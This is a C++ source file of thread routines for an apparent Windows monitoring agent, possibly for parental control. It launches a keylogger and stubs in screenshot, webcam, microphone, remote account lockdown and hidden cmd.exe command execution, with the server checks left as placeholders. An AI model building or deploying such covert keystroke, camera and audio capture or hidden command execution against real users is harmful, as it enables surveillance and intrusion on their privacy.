#include "TaskRoutines.h"
#include <string>

DWORD WINAPI initFiltering(LPVOID lpParam)
{
	return 0;
}
DWORD WINAPI initKeylogger(LPVOID lpParam)
{
	while (1) {
		QUERY_USER_NOTIFICATION_STATE pquns;
		SHQueryUserNotificationState(&pquns);
		if (pquns == QUNS_BUSY || pquns == QUNS_RUNNING_D3D_FULL_SCREEN) // Determine a fullscreen state
		{
			// User in fullscreen mode
			// Go to sleep until its over 0_0
			Sleep(SYNC_TIME);
			continue;
		}
		// Get time and date
		time_t rawtime;
		struct tm* timeinfo;
		time(&rawtime);
		timeinfo = localtime(&rawtime);
		char dateString[80];
		wchar_t dateStringW[80];
		// Get the date as a string
		strftime(dateString, sizeof(dateString), "keylog.%d.%m.%Y.%H.%M.%S", timeinfo);
		// Cast the string to LPCWSTR
		mbstowcs(dateStringW, dateString, strlen(dateString) + 1);//Plus null
		LPCWSTR ptr = dateStringW;
		// Call the keylogger with current date as filename
		// Filename changes every { num_seconds } declared in the keylogger.cpp file 
		keylogger(dateStringW);
	}
	return 0;
}
DWORD WINAPI initScreenshot(LPVOID lpParam)
{
	while (1) {
		bool newRequest = false; // Get screenshots request from server
		if (newRequest)
			screenCapture(0, 0, 1920, 1080, "screenshot.bmp");
		Sleep(SYNC_TIME);
		newRequest = !newRequest;
	}
	return 0;
}
DWORD WINAPI initCamera(LPVOID lpParam)
{
	while (1) {
		bool newRequest = false; // Get camera request from server
		if (newRequest)
			camera();
		Sleep(SYNC_TIME);
		newRequest = !newRequest;
	}
	return 0;
}
DWORD WINAPI initMic(LPVOID lpParam)
{
	while (1) {
		bool newRequest = false; // Get microphone request from server
		if (newRequest)
			recordAudio(10); // Record for 10 seconds
		Sleep(SYNC_TIME); 
		newRequest = !newRequest;
	}
	return 0;
}
DWORD WINAPI initRemoteLockdown(LPVOID lpParam)
{
	while (1) {
		bool newRequest = false; // Get lock request from server
		if (newRequest)
		{
			char* newPassword = generateRandomPass();
			// TODO: Send the new password to parent account
			wchar_t wPassword[PASSWORD_LEN];
			mbstowcs(wPassword, newPassword, strlen(newPassword) + 1);
			BOOL success = lockUser(wPassword);
		}
		Sleep(SYNC_TIME);
	}
	return 0;
}
DWORD WINAPI initRemoteCommands(LPVOID lpParam)
{
	while (1) {
		bool newRequest = false; // Get command request from server
		if (newRequest)
		{
			LPCWSTR cmd = L"ipconfig";
			LPCWSTR o_cmd = L" > cmd_output.txt";
			std::wstring stdResult = std::wstring(cmd) + o_cmd;
			LPCWSTR final_cmd = stdResult.c_str();
			ShellExecute(0, L"open", L"cmd.exe", final_cmd, 0, SW_HIDE);
			newRequest = !newRequest;
		} 
		Sleep(SYNC_TIME);
	}
	return 0;
}
